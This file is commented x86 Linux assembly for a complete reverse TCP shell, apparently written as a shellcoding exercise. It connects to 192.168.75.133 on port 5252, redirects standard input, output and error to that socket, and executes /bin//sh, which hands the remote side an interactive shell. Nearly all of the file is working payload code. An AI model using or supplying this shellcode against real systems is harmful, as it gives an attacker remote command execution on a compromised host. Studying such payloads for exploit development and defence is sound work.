global _start
section .text

_start:
	; create TCP socket
	; s = socket (2,1,0)

	push BYTE 0x66			; socketcall #102 (0x66)
	pop eax				; pop 0x66 into eax
	cdq 				; zero out edx for use as a null DWORD later. Similar to xor edx, edx but saves 1 byte
	xor ebx,ebx 			; zero out ebx  which will contain the type of socketcall
	inc ebx				; SYS_SOCKET= 1 - similar to moving 1 into bl, but smaller
	push edx			; building arg array: { protocol = 0,
	push BYTE 0x1			; SOCK_STREAM = 1,
	push BYTE 0x2			; AF_INET = 2 }
	mov ecx, esp			; contains socket file descriptors
	int 0x80			; perform syscall
	
	xchg esi, eax 			; save socked fd in esi for later

	; perform connect
	; #SYS_CONNECT	3
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; connect (2, [2, 5252 192.168.75.133], 16) 	
	; struct sockaddr {
   	;	 unsigned short    sa_family;    // address family, AF_xxx
    	;	 char              sa_data[14];  // 14 bytes of protocol address
        ;        }
	; being a pointer, sockaddr will have to be pushed onto the stack
	; conversion for IP 192.168.75.133 in network byte order = 0x854ba8c0
	; conversion for port 5252 = 0x8414

	xor eax, eax			; zero out eax
	push BYTE 0x66			; socketcall #102
	pop eax
	inc ebx 			; now takes value 2
	push DWORD 0x854ba8c0   ; IP address
	push WORD 0x8414		; port
	push WORD bx 			; AF_INET
	mov ecx, esp 			; move stack pointer to ecx (at this point our sockaddr structure is complete)

	push BYTE 16 			; argv: {sizeof(server struct) = 16,
	push ecx			; 	server struct pointer,
	push esi			;	socket file descriptor}
	mov ecx, esp 			; ecx= arg array
	
	inc ebx				; now takes value 3 (SYS_Connect)
	int 0x80 			; perform syscall
	
	; redirect descriptors stdin out and error to client socket descriptor
	; used syscall is SYS_DUP2 		
	; dup2(ebx, {0,1,2})

    	xor ecx, ecx            	; zer out ecx
for:    
    	mov al, 0x3f            	; dup2
   	int 0x80            		; perform syscall
    	inc ecx             		; interate through file descriptors (0,1,2)
   	cmp cl,0x4          		; check if done
    	jne for             		; repeat
	

	; execute /bin//sh 
	; execve("/bin//sh", null, null)
	; write them in reverse order
	
   	mov al, 0xb                 	; execve()  
    	push edx                   	; nulls for string termination
    	push 0x68732f2f             	; "hs//"  
    	push 0x6e69622f             	; "nib/"  
        mov ebx, esp                	; put addres of /bin//sh into ebx  
    	push edx            		; push 32 bit null terminator
    	mov edx, esp               	; empty area for envp
    	push ebx                    	; push string addr to stack above null terminator
    	mov ecx, esp                	; argv array
        int 0x80                	; peform syscall
